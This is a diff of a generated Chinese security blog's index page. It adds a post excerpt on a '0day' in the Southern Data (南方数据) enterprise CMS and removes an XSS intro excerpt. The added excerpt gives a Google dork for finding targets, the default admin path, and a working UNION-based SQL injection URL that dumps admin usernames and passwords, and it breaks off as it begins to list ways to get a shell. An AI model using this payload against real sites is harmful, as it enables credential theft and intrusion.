@@ -143,6 +143,51 @@
       <div class="body-wrap">
         
   
+    <article id="post-南方0day" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="南方数据企业0day漏洞"><a href="#南方数据企业0day漏洞" class="headerlink" title="南方数据企业0day漏洞"></a>南方数据企业0day漏洞</h2><p><strong>00x0 漏洞简述</strong></p>
+<p>该漏洞其实早就爆出了。</p>
+<p>漏洞影响版本 v10.0、v11.0。</p>
+<p>关键字：“inurl:HomeMarket.asp”</p>
+<p>默认后台：/admin</p>
+<p>直接爆出用户密码，构造 URL 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/NewsType.asp?SmallClass=&apos; union select 0,username+CHR(124)+password,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and &apos;&apos;=&apos;</div></pre></td></tr></table></figure>
+<p>拿 shell 方法貌似有三种：</p>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2017/07/14/南方0day/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2017/07/14/南方0day/" class="archive-article-date">
+  	<time datetime="2017-07-14T07:28:51.294Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
+</a>
+      
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-加密文件" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -301,56 +346,6 @@
       
       <a href="/2017/07/14/ZeroNet/" class="archive-article-date">
   	<time datetime="2017-07-14T07:28:51.272Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p>XSS 是一种既热门又不太重视的Web攻击手法，原因有下：</p>
-<ol>
-<li><p>耗时间</p>
-</li>
-<li><p>有一定几率不成功</p>
-</li>
-<li><p>没有相应的软件来完成自动化攻击</p>
-</li>
-<li><p>前期需要基本的 HTML、JS 功底，后期需要扎实的 HTML、JS、Actionscript2/3.0 等语言的功底</p>
-</li>
-<li><p>是一种被动的攻击手法</p>
-</li>
-<li><p>对 website 有 http-only、crossdomain.xml 没有用   </p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/07/14/XSS/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/07/14/XSS/" class="archive-article-date">
-  	<time datetime="2017-07-14T07:28:51.267Z" itemprop="datePublished"><i class="icon-clock"></i>2017-07-14</time>
 </a>
       
       
